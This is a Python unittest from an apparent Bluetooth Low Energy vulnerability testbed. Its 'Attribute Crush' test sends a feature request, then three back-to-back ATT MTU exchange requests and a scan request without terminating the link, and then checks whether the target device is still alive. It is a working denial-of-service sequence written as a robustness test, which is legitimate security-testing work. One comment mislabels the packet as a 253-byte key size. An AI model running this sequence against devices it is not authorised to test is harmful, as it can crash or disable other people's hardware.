#!/usr/bin/env python

""" Test suite """

from __future__ import print_function
import sqlite3
import sys
import unittest
import core.ble as ble
from core.logging_utils import *
from mongodb_database.connect_mongodb import *
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
import datetime
import os
from sql_database.connect import  *
log = logging.getLogger(__name__)
class Test_LL_ATT_CRUSH(unittest.TestCase):


    @classmethod
    def setUpClass(cls):
        c = config.loadConfig()
        attack='Attribute Crush'
        cls.comPortNRF = c['TESTBED']['COM_PORT_NRF']
        cls.advertiser_address = c['TESTBED']['ADVERTISER_ADDRESS']
        cls.master_address = c['TESTBED']['MASTER_ADDRESS']
        cls.access_address = int(c['TESTBED']['ACCESS_ADDRESS'], 16)
        cls.connection = c['TESTBED']['CONNECTION_TO_DATABASE']
        log.info('Advertiser Address: ' + cls.advertiser_address.upper())
        # Open serial port of NRF52 Dongle
        cls.driver = NRF52Dongle(cls.comPortNRF, '115200')
        date = str(datetime.datetime.today()).split()[0].encode('ascii', 'ignore')

        # Choose from test.conf file  type of database to insert data
        if str(c['TESTBED']['DATABASE_VERSION']) == 'SQL':
            insert_data_to_link_layer_tests(cls.advertiser_address, cls.master_address, cls.access_address, date,
                                            attack, cls.comPortNRF)

        elif str(c['TESTBED']['DATABASE_VERSION']) == 'MONGODB':
            client = insert_data_to_collection_info_tests(attack)
            close_connection_to_database(client)


        elif str(c['TESTBED']['DATABASE_VERSION']) == 'BOTH':
            insert_data_to_link_layer_tests(cls.advertiser_address, cls.master_address, cls.access_address, date,
                                            attack, cls.comPortNRF)
            client = insert_data_to_collection_info_tests(attack)
            close_connection_to_database(client)


        else:
            print('Continue with no database')
            pass

    def setUp(self):
        # Connect to device
        connected = ble.connect(self.driver, self.master_address, self.advertiser_address, self.access_address)
        self.assertTrue(connected, "Failed to connect")

    def tearDown(self):
        ble.disconnect(self.driver)

    @classmethod
    def tearDownClass(cls):
        cls.driver.close()

    def test_link_layer_LL_ATT_CRUSH(self):

        none_count = 0
        # Send feature request
        pkt = BTLE(access_addr=self.access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ()
        self.driver.send(pkt)
        log.info('Waiting for activity')


        while True:
            pkt = None
            # Receive packet from the NRF52 Dongle
            data = self.driver.raw_receive()
            if data:
                # Decode Bluetooth Low Energy Data
                pkt = BTLE(data)
                # if packet is incorrectly decoded, you may not be using the dongle
                if pkt is None:
                    none_count += 1
                    if none_count >= 4:
                        log.info('NRF52 Dongle not detected')
                        sys.exit(0)
                    continue
                elif BTLE_DATA in pkt and BTLE_EMPTY_PDU not in pkt:
                    # Print slave data channel PDUs summary
                    log.info("Slave RX <--- " + pkt.summary()[7:])

                if LL_FEATURE_RSP in pkt:
                    # Here we send a key size with 253, which is way higher than the usual 16 bytes for the pairing procedure
                    att_mtu_req = BTLE(
                        access_addr=self.access_address) / BTLE_DATA() / L2CAP_Hdr() / ble.ATT_Hdr() /  ble.ATT_Exchange_MTU_Request(
                        mtu=247)
                    for i in range (3):
                      self.driver.send(att_mtu_req)  #Send mtu request again (3 consecutive connection events)
                      log.info('Sending three att_mtu_req')
                    # pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_TERMINATE_IND()
                    # self.driver.send(pkt)
                    scan_req= BTLE() / BTLE_ADV(RxAdd=0) / BTLE_SCAN_REQ(ScanA=self.master_address,AdvA=self.advertiser_address)
                    self.driver.send(scan_req)
                    log.info('Disconnecting from slave') #Go back to advertisement channel (without sending LL_TERMINATE_IND)
                    #self.driver.send(scan_req)  # Go back to advertisement channel (without sending LL_TERMINATE_IND)
                    pulse = ble.check_pulse_via_mtu_exchange(self.driver, self.access_address)
                    #pulse = ble.check_pulse_via_scan(self.driver,self.master_address, self.advertiser_address)
                    self.assertTrue(pulse, "Device did not respond to provisioning. Presumed dead....")
                    break


        log.info('Test Completed')
